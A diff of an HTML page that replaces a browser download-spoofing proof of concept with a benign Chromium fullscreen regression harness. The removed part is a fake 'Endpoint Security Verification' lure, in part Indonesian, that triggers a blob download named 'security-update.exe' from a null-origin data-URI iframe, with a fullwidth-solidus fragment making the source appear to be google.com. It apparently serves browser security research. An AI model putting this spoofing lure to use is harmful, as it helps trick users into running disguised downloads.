@@ -1,184 +1,146 @@
+
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Security Verification Portal</title>
+<title>Chromium Fullscreen Deep Regression</title>
 <style>
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-    background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-    color: #202124;
-    display: flex;
-    flex-direction: column;
-    align-items: center;
-    justify-content: center;
-    height: 100vh;
-    text-align: center;
-  }
-  .container {
-    background: #fff;
-    padding: 48px;
-    border-radius: 12px;
-    box-shadow: 0 20px 60px rgba(0,0,0,0.1);
-    max-width: 520px;
-    width: 90%;
-  }
-  .shield-icon {
-    width: 64px;
-    height: 64px;
-    margin: 0 auto 24px;
-    background: #1a73e8;
-    border-radius: 50%;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-  .shield-icon svg { width: 32px; height: 32px; fill: white; }
-  h2 { font-weight: 400; margin-bottom: 16px; color: #202124; font-size: 1.5rem; }
-  p { color: #5f6368; margin-bottom: 32px; line-height: 1.6; font-size: 0.95rem; }
-  
-  .btn-verify {
-    padding: 14px 32px;
-    font-size: 1rem;
-    font-weight: 500;
-    background: #1a73e8;
-    color: white;
-    border: none;
-    border-radius: 6px;
-    cursor: pointer;
-    transition: all 0.2s;
-    display: inline-flex;
-    align-items: center;
-    gap: 10px;
-    box-shadow: 0 4px 12px rgba(26,115,232,0.3);
-  }
-  .btn-verify:hover { 
-    background: #1557b0; 
-    transform: translateY(-2px);
-    box-shadow: 0 6px 16px rgba(26,115,232,0.4);
-  }
-  .btn-verify:disabled { 
-    background: #1a73e8; 
-    opacity: 0.7; 
-    cursor: wait;
-    transform: none;
-  }
-
-  .status-log {
-    margin-top: 32px;
-    padding: 16px;
-    background: #f8f9fa;
-    border-radius: 6px;
-    font-family: 'Courier New', monospace;
-    font-size: 11px;
-    color: #3c4043;
-    text-align: left;
-    display: none;
-    border-left: 4px solid #1a73e8;
-  }
-  .status-log.visible { display: block; }
-  .log-success { color: #188038; font-weight: bold; }
-  .log-warning { color: #e37400; font-weight: bold; }
+body { background:#111; color:#eee; font:14px monospace; padding:20px }
+button { padding:10px; margin:4px }
+#stage { padding:30px; background:#222; min-height:150px }
+#trace { height:350px; overflow:auto; background:#000; padding:12px; white-space:pre-wrap }
 </style>
 </head>
 <body>
+<h2>Fullscreen Deep Regression Harness</h2>
 
-  <div class="container">
-    <div class="shield-icon">
-      <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
-    </div>
-    <h2>Endpoint Security Verification</h2>
-    <p>
-      Sistem kami mendeteksi aktivitas tidak biasa. Silakan unduh dan jalankan 
-      tool verifikasi untuk memastikan integritas sistem Anda.
-    </p>
-    
-    <button class="btn-verify" id="triggerBtn" onclick="executeDeepNullOrigin()">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
-      Run Security Verification
-    </button>
+<button id="enter">Enter fullscreen</button>
+<button id="download">Download burst</button>
+<button id="input">Input burst</button>
+<button id="exit">Exit fullscreen</button>
+<button id="clear">Clear trace</button>
 
-    <div class="status-log" id="statusLog"></div>
-  </div>
+<div id="stage" tabindex="0">
+  <h3>Test surface</h3>
+  <p id="state">Fullscreen: false</p>
+</div>
 
-  <script>
-    function logStatus(message, type = 'normal') {
-      const log = document.getElementById('statusLog');
-      log.classList.add('visible');
-      const typeClass = type === 'success' ? 'log-success' : type === 'warning' ? 'log-warning' : '';
-      log.innerHTML += `<div class="${typeClass}">> ${message}</div>`;
-    }
+<h3>Trace</h3>
+<div id="trace"></div>
 
-    function executeDeepNullOrigin() {
-      const btn = document.getElementById('triggerBtn');
-      btn.disabled = true;
-      btn.innerHTML = `Verifying & Downloading...`;
-      
-      logStatus('Initializing isolated null-origin environment...', 'warning');
+<script>
+const stage = document.querySelector("#stage");
+const output = document.querySelector("#trace");
+const state = document.querySelector("#state");
 
-      // TEKNIK DEEP: Menggunakan Data URI untuk memaksa origin menjadi 'null' 100%
-      // Ini mencegah browser mewarisi origin 'https://abhirdd.github.io'
-      const payload = `
-        <script>
-          // 1. Buat File Content
-          const content = "SECURITY VERIFICATION TOOL\\n\\nPoC: Deep Null-Origin Spoofing via Data URI Isolation";
-          const blob = new Blob([content], { type: 'application/octet-stream' });
-          
-          // 2. Generate Object URL. Karena ini di Data URI, hasilnya PASTI 'blob:null/<uuid>'
-          const objectUrl = URL.createObjectURL(blob);
-          
-          // 3. Inject Fullwidth Solidus Spoofing
-          const trustedDomain = "google.com";
-          const spoofedUrl = objectUrl + "#%EF%BC%8F" + trustedDomain;
-          
-          // 4. Trigger Download menggunakan Anchor Tag murni (TANPA Form GET yang menambah query string)
-          const a = document.createElement('a');
-          a.href = spoofedUrl;
-          a.download = "security-update.exe";
-          document.body.appendChild(a);
-          a.click();
-          
-          // 5. Cleanup & Notify Parent
-          setTimeout(() => {
-            a.remove();
-            URL.revokeObjectURL(objectUrl);
-            if (window.parent) {
-              window.parent.postMessage({ status: 'download_complete', url: spoofedUrl }, '*');
-            }
-          }, 1000);
-        <\/script>
-      `;
+let sequence = 0;
+let testStart = performance.now();
 
-      // Encode payload ke Data URI
-      const dataUri = 'data:text/html;charset=utf-8,' + encodeURIComponent(payload);
-      
-      // Buat iframe dan set src ke Data URI
-      const iframe = document.createElement('iframe');
-      iframe.style.display = 'none';
-      iframe.src = dataUri; 
-      document.body.appendChild(iframe);
+function log(event, details = {}) {
+  const entry = {
+    sequence: ++sequence,
+    elapsed: +(performance.now() - testStart).toFixed(3),
+    event,
+    fullscreen: !!document.fullscreenElement,
+    visibility: document.visibilityState,
+    focus: document.hasFocus(),
+    details
+  };
 
-      logStatus('✓ Data URI iframe deployed (Guaranteed null origin)', 'success');
-      logStatus('✓ Form GET removed (No query string pollution)', 'success');
-      logStatus('✓ Download triggered with pure fragment spoofing', 'success');
-      logStatus('═══════════════════════════════════════════════════', 'warning');
-      logStatus('ACTION: Buka tab baru dan ketik: chrome://downloads', 'warning');
-      logStatus('HASIL YANG DIHARAPKAN: blob:null/<uuid>#%EF%BC%8Fgoogle.com', 'warning');
-      logStatus('CHECK: Hover nama file, status bar akan menampilkan spoofing', 'warning');
-      logStatus('═══════════════════════════════════════════════════', 'warning');
+  output.textContent += JSON.stringify(entry) + "\n";
+  output.scrollTop = output.scrollHeight;
+}
 
-      // Listen untuk pesan dari iframe
-      window.addEventListener('message', (event) => {
-        if (event.data && event.data.status === 'download_complete') {
-          logStatus(`Download completed. Spoofed URL: ${event.data.url}`, 'success');
-          btn.disabled = false;
-          btn.innerHTML = `<svg width="18" height="18" viewBox="0 0 24 24" fill="white"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg> Run Security Verification`;
-          iframe.remove();
-        }
-      });
-    }
-  </script>
+async function enterFullscreen() {
+  try {
+    await stage.requestFullscreen();
+    log("fullscreen-request-resolved");
+  } catch (error) {
+    log("fullscreen-request-rejected", {
+      name: error.name,
+      message: error.message
+    });
+  }
+}
+
+function downloadOnce(index) {
+  const content = `Regression probe ${index}\n${Date.now()}`;
+  const blob = new Blob([content], {
+    type: "text/plain"
+  });
+
+  const url = URL.createObjectURL(blob);
+  const link = document.createElement("a");
+
+  link.href = url;
+  link.download = `probe-${index}.txt`;
+  link.click();
+
+  setTimeout(() => URL.revokeObjectURL(url), 5000);
+  log("download-triggered", { index });
+}
+
+function downloadBurst() {
+  log("download-burst-start");
+
+  for (let i = 0; i < 3; i++) {
+    setTimeout(() => downloadOnce(i), i * 100);
+  }
+}
+
+function inputBurst() {
+  log("input-burst-start");
+
+  stage.focus();
+
+  for (let i = 0; i < 10; i++) {
+    setTimeout(() => {
+      stage.dispatchEvent(new Event("probe-input"));
+      log("synthetic-probe-event", { index: i });
+    }, i * 50);
+  }
+}
+
+document.querySelector("#enter").onclick = enterFullscreen;
+document.querySelector("#download").onclick = downloadBurst;
+document.querySelector("#input").onclick = inputBurst;
+
+document.querySelector("#exit").onclick = async () => {
+  if (document.fullscreenElement) {
+    await document.exitFullscreen();
+    log("fullscreen-exit-requested");
+  }
+};
+
+document.querySelector("#clear").onclick = () => {
+  output.textContent = "";
+  sequence = 0;
+  testStart = performance.now();
+};
+
+document.addEventListener("fullscreenchange", () => {
+  state.textContent =
+    `Fullscreen: ${!!document.fullscreenElement}`;
+  log("fullscreenchange");
+});
+
+document.addEventListener("keydown", e => {
+  log("keydown", { key: e.key });
+});
+
+document.addEventListener("pointerdown", e => {
+  log("pointerdown", { x: e.clientX, y: e.clientY });
+});
+
+document.addEventListener("visibilitychange", () => {
+  log("visibilitychange");
+});
+
+window.addEventListener("focus", () => log("window-focus"));
+window.addEventListener("blur", () => log("window-blur"));
+
+log("harness-ready");
+</script>
 </body>
 </html>
+
